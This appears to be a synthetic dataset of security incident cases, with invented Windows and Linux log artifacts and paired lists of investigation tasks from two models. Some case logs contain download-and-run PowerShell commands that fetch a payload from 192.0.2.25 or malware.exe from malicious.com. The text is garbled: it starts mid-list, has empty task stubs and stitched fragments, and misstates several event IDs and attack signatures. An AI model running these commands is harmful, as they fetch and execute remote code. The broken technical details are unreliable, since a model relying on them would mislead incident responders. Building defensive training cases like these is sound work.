Title: Probe for SMB write/delete operations after enumeration  
Description: Search the file server event logs for any File Write/Delete (IDs 5145, 5144) or Remote Call execution (ID 5155) from the external IP following the enumeration window. Unexpected file modifications may indicate lateral movement or data staging.

Task #8  
Title: Conduct threat‑intel lookup on source IP  
Description: Query commercial and open‑source threat‑intel feeds for reputation, past malicious activity, and affiliation of IP 203.17.18.29. Note any association with known SMB exploitation campaigns.

Task #9  
Title: Detect pass‑the‑hash or credential‑dumping indicators  
Description: Search security logs for successful SMB logons (ID 4624) where the Logon Process field contains “NTLM” but the authentication package is “Kerberos” or vice‑versa. Look for signs of credential dumping tools like mimikatz listing SMB hashes.

Task #10  
Title: Initiate rapid containment by blocking source IP  
Description: Apply a temporary deny rule on the next firewall and update IDS signatures to drop all inbound TCP flows from 203.17.18.29 on SMB ports. Monitor for any attempts to circumvent the block (e.g., via proxy or port tunneling).

Task #11  
Title: Notify internal teams and trigger incident‑response workflow  
Description: Dispatch alerts to system administrators of ‘files01’ and ‘dc01’, and inform the incident‑response squad. Include key findings and recommended mitigations to accelerate containment.

Task #12  
Title: Document findings and actions in SOAR playbook  
Description: Log all collected evidence, analysis steps, timestamps, and decisions made into the SOAR platform. Tag the case for trend analysis and future reference, ensuring traceability for audit purposes.

case_title: Unexpected modification of the critical Windows system file 'services.exe' detected on a domain controller
case_description:
- Sysmon event ID 13 (File creation or modification) at 2026‑03‑10T03:15:30Z: file path C:\Windows\System32\services.exe, process C:\Windows\System32\csrss.exe, user NT AUTHORITY\SYSTEM, command line “csrss.exe -d \Isolated”.  
- Sysmon event ID 12 (File modification) at 2026‑03‑10T03:15:30Z: hash before 0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c, hash after 1a2b3c4d5e6f7a8b9c0d1e2f3b4c5d6e7f8a9b0c, file name services.exe.  
- File Integrity Monitor: pre‑modification SHA256 3d5f43979c5a3016e4b9b1ae97d87a9b6c2a13b7f9c1e2d4f6a8b9c0d1e2f3a4, post‑modification SHA256 5f9d3e7c6b8a3910e4d5b6c7a8f9d0e1c2b3a4d5f6e7c8b9a0d1e2f3c4b5a6, file size changed from 4096 to 8192 bytes.  
- Windows Security Event ID 4663: object access (FILE_WRITE_DATA) on C:\Windows\System32\services.exe by user NT AUTHORITY\SYSTEM, Logon ID: 0x0.  
- Audit Log event ID 4608: Process creation svcmod.exe by user Administrator with parent process cmd.exe.  
- Process tree: cmd.exe (pid 1234) → PowerShell (pid 5678) → svcmod.exe (pid 9101).  
- File last modified timestamp changed from 2026‑02‑28T12:24:00Z to 2026‑03‑10T03:15:30Z.  
- Alternate Data Stream discovered on services.exe: “modifications.txt” containing the string “modified”.  
- Windows Firewall log: inbound connection to port 445 from IP 10.0.0.55, rule “Allow SMB” triggered.  
- Windows Event ID 5145: “A network share object was accessed” on \\SERVER01\SysVol by user NT AUTHORITY\SYSTEM.
model_a_tasks:
Task #1  
Title: Verify the authenticity of the modified services.exe binary  
Description: Obtain a known-good hash for the legitimate services.exe from a trusted Windows image or Microsoft API and compare it to the observed hash (1a2b3c4d...). Validate the digital signature of the file to confirm it was not tampered with or replaced.

Task #2  
Title: Correlate Sysmon events with File Integrity Monitor output  
Description: Cross‑reference the Sysmon event ID 12 and ID 13 timestamps with the FIM records to ensure the modification is not part of a legitimate Windows update or service pack, and to identify any additional file changes that may have occurred in the same window.

Task #3  
Title: Inspect the command line execution chain of svcmod.exe  
Description: Extract the full command line arguments for svcmod.exe and its parent processes (PowerShell, cmd.exe). Verify whether the PowerShell script or cmd.exe session contained obfuscated or encoded payloads that could indicate malicious intent.

Task #4  
Title: Acquire memory dump from the domain controller during the modification window  
Description: Capture a memory image (e.g., using Volatility or Windows memory forensics tools) around 03:15:30Z to investigate any hidden processes, injected DLLs, or rootkits that may be associated with the modification.

Task #5  
Title: Analyze the alternate data stream (ADS) on services.exe  
Description: Use file‑system tools (e.g., Get-Item, StreamScanner) to read the contents of the “modifications.txt” ADS and search for additional markers, timestamps, or command strings that could reveal the attacker’s activity.

Task #6  
Title: Examine inbound SMB traffic from 10.0.0.55  
Description: Review network flow logs and the Windows Firewall event ID 5145 to determine if the connection to port 445 was legitimate (e.g., a scheduled update or legitimate share access) or indicative of lateral movement or data exfiltration.

Task #7  
Title: Assess SMB share access on \\SERVER01\SysVol for suspicious activity  
Description: Investigate Event ID 5145 entries targeting the SysVol share to identify any unauthorized modifications, new files, or unusual access patterns that could signal domain compromise.

Task #8  
Title: Review recent scheduled tasks and startup items on the domain controller  
Description: Enumerate all scheduled tasks and startup registry entries to detect any that were added or modified around the time of the file change, which might provide persistence for the attacker.

Task #9  
Title: Check for service registration changes following the file modification  
Description: Investigate Windows services configuration (e.g., using sc query and the Services MMC console) for any modifications to the services.exe path, startup type, or parameters that could indicate tampering or exploitation.

Task #10  
Title: Validate local security policy file integrity against the vendor baseline  
Description: Compare the domain controller’s security policy files (including ACLs and group policy objects) to known-good baselines to ensure no unauthorized modifications were made concurrently with the services.exe change.

Task #11  
Title: Profile the integrity and provenance of svcmod.exe  
Description: Analyze svcmod.exe by computing hashes, checking file creation timestamps, and performing a static code analysis or sandbox execution to determine if it is a legitimate utility or a custom backdoor.

Task #12  
Title: Conduct an audit of privileged account activity during the modification window  
Description: Filter Security event IDs 4720–4725, 4719, and 4672 to identify any privilege escalation or creation of new administrative accounts that might have facilitated the file modification.

Task #13  
Title: Examine the CSRSS process usage for anomalous behavior  
Description: Review Process Explorer or Windows Sysinternals logs to confirm whether csrss.exe was legitimately used to spawn svcmod.exe and to detect any abnormal flags or memory usage patterns.

Task #14  
Title: Search for Indicators of Compromise (IOCs) across the domain  
Description: Deploy IOC search queries (hashes, file paths, network IPs) across domain controllers and related servers to identify any additional compromised assets or related malicious artifacts.

case_description:
- Source IP: 10.4.5.6; Destination IPs: 192.168.1.1-192.168.1.50; Protocol: TCP SYN; Ports scanned: 22, 80, 443, 3306, 21; Timestamp: 2026-03-10 09:12:00-09:12:45; Packets: 300  
- IDS alert: Snort rule 2145 triggered at 2026-03-10 09:12:20; src: 10.4.5.6, dst: 192.168.1.3; alert: “src_port_scan from 10.4.5.6 to 192.168.1.3”  
- NetFlow record: 10.4.5.6 → 192.168.1.0/24 total packets: 125; bytes: 6,432  
- Firewall log: Rule 1045 (block SYN) triggered 50 times for src 10.4.5.6 to dst 192.168.1.*; packets dropped  
- ACL logs: 10.4.5.6 sent ARP requests for 192.168.1.10-192.168.1.20, received ARP replies; DHCP Discover/Request from 10.4.5.6 at 09:12:05  
- ICMP echo-request: 10.4.5.6 to 192.168.1.15 at 09:12:15; reply at 09:12:16; repeated round trip 10 times within 30 seconds

case_title: Suspicious privilege escalation attempt via local administrators group addition and malicious scheduled task creation
case_description: Event ID 4728: “evil_user” added to Administrators; Event ID 4756: “evil_user” added to Local System; Sysmon process creation: cmd.exe executed via psexec to run LSASS injection; PowerShell script c:\scripts\escalate.ps1 executed “Invoke‑Mimikatz”, dumping LSASS credentials; Scheduled task “PrivEscTask” created to run c:\escalate\escalate.exe as SYSTEM; SMB connection from 192.168.1.101 to 10.0.0.55:445; DLL file temp.dll found in C:\Windows\Temp flagged by AV; LSASS injection attempt detected in Sysmon.
model_a_tasks:
Task #1  
Title: Verify “evil_user” group memberships  
Description: Retrieve Windows security logs and group membership queries to confirm that “evil_user” was added to the Administrators and Local System groups. Identify the account or process responsible for these changes and investigate whether the addition was authorized.

Task #2  
Title: Analyze Sysmon injection events for LSASS  
Description: Filter Sysmon logs for process creation events indicating LSASS injection attempts. Verify the parent/child relationships, command lines, and any DLL load events that indicate a credential dumping or privilege escalation activity.

Task #3  
Title: Review the PowerShell escalation script  
Description: Pull the file “c:\scripts\escalate.ps1” from the host, review its contents for malicious code, particularly any calls to Invoke‑Mimikatz. Examine scheduled execution times, user context, and output logs for evidence of credential dumping.

Task #4  
Title: Inspect the Scheduled Task “PrivEscTask”  
Description: Enumerate the scheduled task’s properties (path, actions, triggers, run-as user, privileges) and review task history to determine if it has actually executed. Check for evidence of task tampering or privilege abuse.

Task #5  
Title: Investigate the “temp.dll” file in the Temp folder  
Description: Verify the existence of “C:\Windows\Temp\temp.dll”, run an antivirus scan, and analyze its import table and string references for malicious behavior. Check if the DLL was loaded by any process during the investigation period.

Task #6  
Title: Correlate SMB session to lateral movement  
Description: Retrieve SMB logs for the connection from 192.168.1.101 to 10.0.0.55:445. Identify the remote share accessed, files transferred, and any authenticated accounts involved. Assess whether this indicates an attacker moving between hosts.

Task #7  
Title: Confirm LSASS memory dumping results  
Description: Search event logs and memory forensic artifacts for evidence of LSASS memory dumps or extracted credentials. Verify if Mimikatz successfully executed and captured stored credentials or tokens.

Task #8  
Title: Scan host for unauthorized registry or startup modifications  
Description: Compare the current registry state and startup folders against known baselines. Look for unusual entries in HKLM\SYSTEM\CurrentControlSet\Control\Lsa, Winlogon, or scheduled tasks that may signal persistence mechanisms.

Task #9  
Title: Search for similar privilege escalation activity across the network  
Description: Query the SIEM for other hosts exhibiting Event ID 4728, 4756, Sysmon injection patterns, or creation of suspicious scheduled tasks. Prioritize hosts that share the same domain or network segment as the target machine.

Task #10  
Title: Construct a detailed timeline of all suspicious events  
Description: Correlate timestamps from Event IDs 4728/4756, Sysmon, PowerShell, scheduled task creation, and SMB sessions into a chronological timeline. Highlight overlapping activities and potential causal relationships.

Task #11  
Title: Examine psexec usage for remote command execution  
Description: Investigate any psexec instances that spawned cmd.exe on the target host. Review command line arguments, the remote host (10.0.0.55), and the user account under which the remote command ran to confirm legitimacy or abuse.

Task #12  
Title: Assess the impact on host integrity and recovery actions  
Description: Evaluate whether the attacker achieved persistent SYSTEM-level access. Outline steps to recover group memberships to legitimate state, remove malicious scheduled tasks and DLL, and patch any discovered vulnerabilities.
model_b_tasks:
Task #1  
Title: Verify Administrator Group Membership Change  
Description: Examine Security Event ID 4728 from the victim host to confirm that “evil_user” was added to the local Administrators group. Note the originating IP, domain, and account used for the addition. Cross‑reference with Active Directory synchronization logs to assess if the change propagated beyond the local machine.

Task #2  
Title: Assess Local System Membership Elevation  
Description: Inspect Event ID 4756 for evidence that “evil_user” was added to the Local System (SYSTEM) group. Verify whether this elevation enables command execution in SYSTEM context on the target host. Check the SAM hive to confirm group membership status.

Task #3  
Title: Trace Anomalous cmd.exe Execution via psexec  
Description: Review Sysmon logs for the cmd.exe instance invoked through psexec, capturing PID, PPID, command‑line arguments, and execution timestamps. Identify the remote psexec host (192.168.1.101) and confirm whether cmd.exe was launched on the victim or source machine. Determine if this connection was part of lateral movement.

Task #4  
Title: Investigate PowerShell Escalation Script  
Description: Search Windows PowerShell logs for execution of c:\scripts\escalate.ps1. Collect the script’s full contents, any invoked modules, and specific cmdlets (e.g., Invoke‑Mimikatz). Verify whether Mimikatz was used to dump LSASS credentials and capture the credential dump location.

Task #5  
Title: Examine Scheduled Task PrivEscTask Execution  
Description: Enumerate the PrivEscTask scheduled tasks on the victim host, reviewing triggers, actions, run level, and user context. Confirm that the scheduled task is set to run c:\escalate\escalate.exe as the SYSTEM account. Determine when the task was created and last run.

Task #6  
Title: Analyze SMB Connection Activity  
Description: Review firewall logs, NetFlow data, or packet captures for SMB traffic from 192.168.1.101 to 10.0.0.55:445. Identify accessed shares, shared directories, file names, and authentication methods. Evaluate whether these SMB sessions were legitimate or indicate lateral movement or file exfiltration.

Task #7  
Title: Examine temp.dll Artifact  
Description: Locate temp.dll in C:\Windows\Temp, extract its hash values, and cross‑reference with AV and threat‑intel feeds. Use static analysis tools to determine its purpose and whether it is associated with known privilege‑escalation binaries. Search for references to temp.dll in other logs.

Task #8  
Title: Correlate LSASS Injection Evidence  
Description: Filter Sysmon logs for LSASS injection activity, documenting injector processes, DLL names, memory addresses, and injection timestamps. Cross‑correlate with Event ID 4756 to assess whether the LSASS process was compromised as part of the Local System group addition.

Task #9  
Title: Identify Source of psexec Invocation  
Description: Trace back the psexec command used to launch cmd.exe, locating the source machine’s inventory record in the CMDB. Verify if the source IP corresponds to a known administrative workstation or if it is anomalous. Assess whether the psexec host was previously compromised.

Task #10  
Title: Validate Privilege Escalation Success  
Description: Search for evidence that the escalated privileges were exercised, such as the creation of new high‑privileged users, modifications to security settings or GPOs, or execution of SYSTEM‑level binaries. Run Sysinternals tools (e.g., PsExec, Autoruns) to check for persistence mechanisms introduced by “evil_user”.

Task #11  
Title: Perform Comprehensive Root Cause Analysis  
Description: Reconstruct the attack timeline from initial compromise to privilege escalation, connecting event IDs, host names, source/destination IPs, and payloads. Identify gaps in detection or containment that allowed this progression. Recommend improvements to logging, alerting, and defensive controls.

case_title: Attempted exploitation of internal Windows print server using the PrintNightmare vulnerability
case_description:
Artifacts: – Firewall blocked TCP SYN from 203.0.113.56 to 10.47.12.88:445, flagged as CVE‑2021‑34527 attempt.  
– Syslog: “Blocked malicious traffic – CVE‑2021‑34527” from 203.0.113.56 to 10.47.12.88.  
– Windows event 4625: repeated SMB authentication failures from 10.1.2.3 using domain credentials.  
– PowerShell execution event 4688: command‑line contains Base64‑encoded payload “UEsDBBQABgAIAAAAIQ…” from user “microsoft\\services”.  
– DNS log: query for malicious.c3p-managed.com resolved to 203.0.113.56.  
– Endpoint detection on 10.47.12.88: file creation attempt in c:\windows\system32\spool\svclog.txt with suspicious content.  
Observations: Multiple defensive mechanisms blocked the exploitation attempt, but the logs indicate the attacker supplied a malicious payload and attempted lateral movement. No evidence of successful code execution or privilege escalation is present in current logs.
model_a_tasks:
Task #1  
Title: Gather comprehensive logs from the targeted print server  
Description: Pull Windows event logs (IDs 4625, 4624, 4688, 4703, 4662), Sysmon logs, and endpoint detection logs for the duration of the flagged activity on 10.47.12.88. Include network flow logs and any audit logs capturing service creation or modification events to see if any print‑spooler service changes occurred.

Task #2  
Title: Verify PrintNightmare patch status on the server  
Description: Check the OS version, deployed Windows Updates, and Security Update Rollup status for 10.47.12.88. Confirm that the official patches mitigating CVE‑2021‑34527 are fully applied; if not, document the missing updates and apply them urgently.

Task #3  
Title: Decode and analyze the PowerShell Base64 payload  
Description: Extract the Base64 string from the PowerShell execution event, decode it, and save the resulting script or binary. Analyze the content for malicious commands, persistence mechanisms, or download attempts, and compare it to known malware samples.

Task #4  
Title: Inspect the “spool\svclog.txt” creation attempt 
Description: Review the file system and audit logs to verify that the file was indeed prevented from being written. Search for any temporary or residual files created during the attempt and confirm no remnants remain in the spool directory or elsewhere.

Task #5  
Title: Correlate SMB authentication failures with lateral movement attempts  
Description: Examine Event ID 4625 entries originating from 10.1.2.3 for repeated credential reuse or brute‑force patterns. Cross‑reference with domain controller logs to see if any legitimate or compromised accounts were used, and check if other hosts exhibited similar failures.

Task #6  
Title: Review user “microsoft\services” for abnormal activity  
Description: Determine whether the “microsoft\\services” account is a legitimate service account. Search for any unusual logons, processes, or scheduled tasks running under this identity on 10.47.12.88 and surrounding hosts, indicating possible credential misuse.

Task #7  
Title: Block malicious domain and monitor for future queries  
Description: Add malicious.c3p-managed.com to the DNS sinkhole or block list. Enable logging of all DNS queries to this domain and alert on any subsequent resolutions to 203.0.113.56 or other malicious IPs.

Task #8  
Title: Identify additional internal hosts accessing the attacker IP  
Description: Perform a network traffic correlation across the internal network to find any other connections to 203.0.113.56 or related IP ranges. Look for SMB, RDP, or other protocols that could indicate further lateral movement attempts.

Task #9  
Title: Conduct a threat-hunting search for PrintNightmare execution signatures  
Description: Search SIEM for known PrintNightmare exploitation patterns such as “sc create” or “svchost.exe” process creation with the “svchost -k cups” command. Prioritize matches on 10.47.12.88 and other servers in the domain.

Task #10  
Title: Perform forensic imaging of the affected server for deeper analysis  
Description: Capture a forensic image of the print server’s disk for offline analysis. Verify integrity of the image, and use specialized tools to search for hidden files, registry modifications, or scheduled tasks that may have been added during the attempted exploitation.
model_b_tasks:
Task #1  
Title: Correlate blocked SMB and authentication failure events  
Description: Pull firewall logs, syslog entries, and Windows event ID 4625 for source IP 10.1.2.3 targeting 10.47.12.88. Map the timeline of authentication failures against the blocked TCP  SYN from 203.0.113.56 to 10.47.12.88:445 to confirm the attack path and identify any gaps in defensive coverage.

Task #2  
Title: Decode and analyze the Base64 PowerShell payload  
Description: Base64‑decode the payload string “UEsDBBQABgAIAAAAIQ…​” from event 4688 executed by “microsoft\\services”. Examine the resulting script or binary for malicious commands, anti‑analysis tricks, or dropper activity. If the code is suspicious, isolate it and run in a controlled sandbox environment for deeper analysis.

Task #3  
Title: Verify file creation attempt on the print spool folder  
Description: Search the host 10.47.12.88 for evidence of the attempted creation of `c:\windows\system32\spool\svclog.txt`. Inspect the file (if present) for hidden data, encoded payloads, or signs of obfuscation. Confirm whether the file was fully written, partially written, or deleted during the exploitation attempt.

Task #4  
Title: Confirm patch status of CVE‑2021‑34527 on affected printers  
Description: Query host 10.47.12.88 for its Windows update status, specifically checking for the patch addressing PrintNightmare. If the server remains vulnerable, schedule immediate remediation, implement temporary firewall restrictions on SMB, and document the mitigation process.

Task #5  
Title: Investigate lateral movement source IP 10.1.2.3  
Description: Trace workstation 10.1.2.3 across the network to determine if it was compromised or merely executing legitimate SMB authentication attempts. Review security event logs for unusual credential usage, pass‑the‑hash activity, or unapproved elevation requests. Assess whether lateral movement to the print server was blocked or succeeded undetected.

Task #6  
Title: Audit usage and privileges of the “microsoft\\services” account  
Description: Retrieve the last logon, account properties, and Group Policy settings for “microsoft\\services.” Verify whether this is a legitimate service account and whether it should have the ability to execute PowerShell scripts. If privileges are excessive, reduce them immediately and investigate for potential credential theft.

Task #7  
Title: Assess reputation and activity of malicious IP 203.0.113.56  
Description: Conduct a threat‑intel lookup on 203.0.113.56 to identify past malicious activity, command‑and‑control servers, or affiliation with known APT groups. If the IP is confirmed bad, block it at the firewall perimeter, add to the global IP blocklist, and share findings with the network security team.

Task #8  
Title: Conduct network‑wide lateral movement scan after observed attempts  
Description: Use EDR telemetry and NetFlow data to identify SMB authentication attempts from other internal hosts to 10.47.12.88 and nearby servers. Look for indicators of credential dumping, SMB relay, or scheduled task creation. Update threat models and expand monitoring if new attack patterns emerge.

Task #9  
Title: Search for persistence mechanisms on compromised hosts  
Description: On 10.47.12.88 and any other identified targets, hunt for unauthorized registry Run keys, Scheduled Tasks, New Service definitions, or Startup folder entries pointing to unknown binaries or scripts, especially those originating from the print spooler or PowerShell execution paths.

Task #10  
Title: Detect signs of privilege escalation or anomalous process execution  
Description: Review process creation event IDs, privileged token usage, and startup sequence logs for evidence of privilege escalation (e.g., SAM/RDS sync, DC sync). Correlate any elevated process activity with the timeline of the PrintNightmare exploitation attempt to uncover hidden footholds.

Task #11  
Title: Cross‑reference DNS logs for recurrent malicious c3p‑managed.com queries  
Description: Aggregate all DNS query logs for malicious.c3p‑managed.com over the past 48 hours. Identify hosts performing frequent lookups, correlate with blocked firewall traffic, and implement DNS‑level blocking of the domain. Monitor for continued resolution attempts as a sign of persistence.

Task #12  
Title: Update firewall and IDS/IPS signatures for PrintNightmare exploitation  
Description: Deploy the latest IDS/IPS rule sets targeting CVE‑2021‑34527 traffic patterns. Harden SMB rules to block attempted exploitation vectors (e.g., RCE phases, malicious RPC calls). Enable real‑time alerts and integrate them into the SOAR platform for automated containment actions.

case_title: Unusual Enumeration Activity Detected from External IP 203.0.113.45
case_description:

- Windows Security logs (Event ID 4625) indicate 12 failed authentication attempts from 203.0.113.45 to admin share on 10.1.0.5 between 02:13–02:17 UTC.  
- DNS logs show a zone transfer request (opcode 1) for zone `example.com` from 203.0.113.45 at 02:25 UTC, response code REFUSED.  
- File system artifact: binary `enum4linux` (size 45 KB, permissions `rwx------`) located in `/opt/scripts/` on host 10.1.0.5, timestamped 02:10 UTC.

case_title: Unexpected modification of critical system configuration files detected across multiple endpoints

- Windows Security Event ID 4663 on host2 for file C:\Windows\System32\drivers\etc\hosts accessed by account SYSTEM at 2026‑03‑09 20:43:12.  
- Process list snapshot: PID 8572 (python3) running as root, start time 2026‑03‑10 02:15:00; PID 4532 (powershell.exe) executed Mimikatz at 2026‑03‑10 02:30:15.

case_title: Unauthorized Privilege Escalation Attempt via PowerShell Script Executed on a Domain‑Joined Workstation
case_description:
- Windows Event ID 4688: Process creation – powershell.exe – CommandLine: “-NoProfile -ExecutionPolicy Bypass -Command IEX (New‑Object Net.WebClient).DownloadString('http://192.0.2.25/CustomPayload.ps1')” – User: jdoe – Time: 2024‑03‑10 14:12:08  
- Windows Event ID 4672: Redirection of Privilege – User “jdoe” granted Local System privilege – Time: 2024‑03‑10 14:12:07  
- File: CustomPayload.ps1 – Path: C:\Users\Public\Desktop\CustomPayload.ps1 – SHA256: d41f8cd2213184b8c9f2b3e4f9aeb7c2b1a3e4f5d6c7a8b9c0d1e2f3a4b5c6d7  
- Registry modification: HKLM\SAM – RegKey added to enable "Password Filter DLL" – Machine: Workstation-01 – Time: 2024‑03‑10 14:12:10  
- Network traffic: Outbound HTTPS connection from 10.10.20.15:5454 to 203.0.113.68:443 – Time: 2024‑03‑10 14:12:12 – Payload size: 2.4 KB  
- Group membership change: “net localgroup Administrators jdoe /add” executed – User: jdoe – Time: 2024‑03‑10 14:12:10  
- File: C:\Windows\System32\calc.exe – replaced with malicious binary – SHA256: a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0  
- Egress event: Alert generated by Winlogbeat: “Suspicious outbound connection” – Date: 2024‑03‑10 14:12:12 – Category: Data Leak Prevention  
- Process termination: explorer.exe (PID 2321) terminated in event log – Time: 2024‑03‑10 14:12:15  
- Note: No corresponding IT or security approval record in ticketing system.

Task #4

Task #5

Task #6

Task #7

case_description: Timestamp: 2026-03-10 04:23:11 UTC; Source IP: 203.0.113.48; Destination IP: 192.168.1.27; Ports scanned: 22, 80, 443, 3306, 445, 3389; Protocol: TCP SYN; IDS alerts: Snort rule ID 20000123 (PortScan) triggered 8 times; Firewall logs: 9 events per minute, event ID INFW-20260310-045; NetFlow record: 3.1 MB data, 98 flows, random source ports; Packet capture: only SYN packets, no ACKs or payload; No authentication attempts noted; No malware signatures detected; Attacker IP not on known blacklist; No user-agent string detected.
model_a_tasks:
Task #1

Description: Pull the last 24‑hour logs from the IDS, firewall, and NetFlow to confirm that traffic originates from a genuine external interface and is not spoofed. Task #2

Look for any returned SYN‑ACKs, connection attempts, or error messages that may indicate the host was not prepared for the traffic. This will confirm whether the host’s firewalls responded or if any service was inadvertently exposed.

Task #3

Description: Run a local port scan (e.g., nmap –sS 192.168.1.27) from a trusted internal machine to confirm whether ports 22, 80, 443, 3306, 445, and 3389 are actually listening. Compare the results to the firewall’s configuration to ensure that all open ports are authorized and properly patched. Document any discrepancies between expected and observed services.

Correlate these findings with the IP’s scanning pattern.

Task #6

Verify that only SYN packets were captured and that no ACKs, FINs, or data segments are present. Flag any suspicious patterns for further deep‑packet inspection.

Task #7

case_title: Unexpected modification of system configuration and executable files detected on Windows Server 2019
case_description: File C:\Windows\System32\drivers\etc\hosts modified on 2026-03-01T12:34:56Z by PowerShell.exe (PID 3265) run by Administrator, SHA256 hash changed from d5c4… to f5b3…; Sysmon Event 1: new process PowerShell.exe created with command‑line “-noprofile -executionpolicy bypass -c IEX (New-Object Net.WebClient).DownloadFile('http://malicious.com/malware.exe','C:\malware.exe')”, File C:\malware.exe created at same timestamp, hash 3a5e…; Windows Event 4663: file write to hosts by user Administrator; Windows Event 4720: new local account “temp_user” with admin rights created on 2026-02-28; Network log: outbound TCP to 203.0.113.42:443 at 2026-03-01T12:34:00Z; File attributes for hosts changed to hidden+system; ACL change: added Everyone full‑control to C:\malware.exe.
model_a_tasks:
Task #1  
Title: Validate integrity of modified hosts file and check for anomalous entries  
Description: Retrieve the current C:\Windows\System32\drivers\etc\hosts file and compute its SHA‑256 hash. Compare the hash to the baseline value (d5c4…) and examine the file contents for any unauthorized domain redirects or blocked entries. Verify that the hidden and system attributes were not added before the modification and document any deviations.

Task #2  
Title: Correlate Sysmon and Windows event logs to reconstruct the process timeline  
Description: Extract the Sysmon Event 1 details for PowerShell.exe PID 3265, mapping the command‑line and creation timestamp. Cross‑reference Windows Security Events 4663 (file write) and 4720 (account creation) to build a chronological sequence of events. Identify any gaps or anomalies that could indicate additional malicious activity.

Task #3  
Title: Acquire and analyze the downloaded malware binary  
Description: Copy C:\malware.exe to a sandboxed environment and compute its SHA‑256 hash (3a5e…). Execute the binary within a controlled VMI or Cuckoo sandbox to observe its network behavior, persistence mechanisms, and file system changes. Document all observed behaviors and compare them against known malware families for IOC generation.

Task #4  
Title: Inspect ACL changes on malicious executable  
Description: Query the NTFS ACL of C:\malware.exe to confirm the addition of a Everyone full‑control entry. Determine whether the ACL change was performed during the same PowerShell session that downloaded the file. Assess if other critical system files have similar unauthorized ACL modifications.

Task #5  
Title: Evaluate the newly created “temp_user” account for lateral movement risk  
Description: Review the local account metadata, including creation time (2026‑02‑28) and assigned privileges. Search Windows Security Event 4624 logs for login attempts by “temp_user” and any privileged actions executed. Verify whether the account has been used to access other systems or services within the network.

Task #6  
Title: Investigate outbound network connection to malicious C2  
Description: Retrieve firewall or packet‑capture logs for the TCP session to 203.0.113.42:443 at 12:34:00Z. Inspect the payload for command exchanges, configuration downloads, or data exfiltration. Correlate the connection timing with the malware download and execution timestamps to confirm its role in command and control.

Task #7  
Title: Search for other anomalous file modifications and system configuration changes  
Description: Perform a system‑wide hash comparison against known good baselines, focusing on critical Windows binaries and drivers. Scan Sysmon Process Create and Image Load events for execution of unknown or unsigned binaries. Log any additional changes that match the malware’s modification patterns.

case_title: Unexpected modifications to critical system binaries observed across multiple production hosts
case_description:
- File Integrity Monitoring (OSSEC) alerts on srv-prod-01, db1, and WEB01:  
  * /usr/bin/sshd (srv-prod-01) – old SHA256: abc123... → new SHA256: def456..., timestamp 2026-03-10T02:15:12Z  
  * /opt/mssql/bin/sqlservr (db1) – old SHA256: xyz789... → new SHA256: qwerabcd..., timestamp 2026-03-10T02:16:45Z  
  * /etc/ssh/sshd_config (WEB01) – old SHA256: 0f1a2b3c4d5e6f... → new SHA256: 1234567890abcdef..., timestamp 2026-03-10T02:19:56Z  
- Sysmon event 11 (process creation) on DC01:  
  * PID 5267 (cmd.exe) spawned PID 5268 (powershell.exe) executing `powershell -ExecutionPolicy Bypass -File C:\temp\mal_exec.ps1` to write to C:\Windows\System32\drivers\etc\hosts.  
- Windows Security Event 4663 (ACL change) on DC01:  
  * File: C:\Program Files\Common Files\System.Installer\setup.exe, User: admin, Time: 2026-03-10T02:18:33Z.  
- ELK logs: TCP connection from external IP 203.0.113.45 to internal host PROD01 on port 22 at 2026-03-10T02:20:07Z, followed by SCP transfer of /tmp/upgrade.sh, executed by user root.  
- Auditd logs on db-prod: system calls (open, write, close) recorded on /var/lib/mysql/mysql.ibd at 2026-03-10T02:21:40Z, user: mysql; permission flags show chmod 777 applied.  
- Suspicious binary load on WIN-01: Correlation with CVE-2025-12345 indicator; a PNG file was executed via `cmd /c start hidden.elev.exe`, run by system account.
model_a_tasks:
Task #1  
Title: Validate Modified Binaries and Configuration Files  
Description: Compare the SHA256 hashes of the altered files with those in the official release and with the baseline inventory. Verify that the file modification times and parent directory permissions match known update patterns. If discrepancies exist, flag them as potential tampering.

Task #2  
Title: Trace the Process Modifying /usr/bin/sshd on srv-prod-01  
Description: Review auditd logs, Linux audit rules, and container logs to identify the command and user that wrote to /usr/bin/sshd. Check the parent process chain and any SUID changes that may have enabled write access. Correlate findings with OSSEC alerts for a comprehensive view.

Task #3  
Title: Investigate the PowerShell Script Executed on DC01  
Description: Examine the content and provenance of C:\temp\mal_exec.ps1, including its digital signature, download history, and command arguments. Identify signers, execution context, and whether Persistence mechanisms were added (e.g., registry keys, scheduled tasks). Validate that the script executed System32 changes as seen in the hosts file.

Task #4  
Title: Unpack the ACL Change Event on setup.exe  
Description: Retrieve the audit record for the 4663 event and reconstruct the change sequence (granular ACE modifications). Cross‑reference with user activity logs to determine how `admin` obtained passwordless write privileges. Verify that the change was not part of an authorized installer execution.

Task #5  
Title: Follow the External Connection to PROD01 and SCP Transfer  
Description: Conduct a packet capture (if available) or use NetFlow entries to separate the inbound connection from the subsequent SCP. Verify the authenticity of the uploaded `upgrade.sh` by checking its SHA256, looking for digital signatures, and analyzing its contents for malicious payloads.

Task #6  
Title: Analyze the `upgrade.sh` Execution by User Root  
Description: Confirm that the script was gracefully executed (no residue files, cleanup steps). Evaluate its actions: files written, services restarted, or network sockets opened. Look for evidence of persistence mechanisms or attempts to spread to other hosts.

Task #7  
Title: Scrutinize Auditd System Calls on db-prod’s MySQL Data File  
Description: Parse the audit logs to establish the exact thread that called chmod 777 on /var/lib/mysql/mysql.ibd. Verify whether this was performed by a legitimate process or a privileged attacker. Cross‑check MySQL logs for abnormal write patterns around the same timestamp.

Task #8  
Title: Detect Exploitation of CVE‑2025‑12345 via hidden.elev.exe  
Description: Review the PNG file that was “executed” on WIN‑01, check for any embedded scripts or macros, and run the executable in a sandbox to confirm exploit success. Verify that the system account was used legitimately, and audit process creation for subsequent persistence steps.

Task #9  
Title: Search for Persistence Mechanisms on All Compromised Hosts  
Description: Inspect crontab, systemd units, scheduled tasks, startup folders, and registry Run keys for unfamiliar entries. Look for parent-child relationships that hint at malicious persistence (e.g., cmd.exe→powershell.exe chains). Confirm that executable paths do not reference temporary or non‑standard directories.

Task #10  
Title: Correlate Lateral Movement Indicators Among Hosts  
Description: Build a timeline of events using syslog, Windows Security logs, Sysmon event 11, and ELK flow logs. Map connections between hosts (SMB, RDP, SSH) during the alert window, and examine if the same credentials or service accounts were reused.

Task #11  
Title: Verify Patch and Change‑Management Compliance  
Description: Check the patch status of the affected binaries (sshd, sqlservr, sslhd_config) and confirm that any recent updates align with the observed modifications. Cross‑reference with change‑management tickets and deployment schedules to rule out authorized changes.

Task #12  
Title: Compile and Document Evidence for Incident Response  
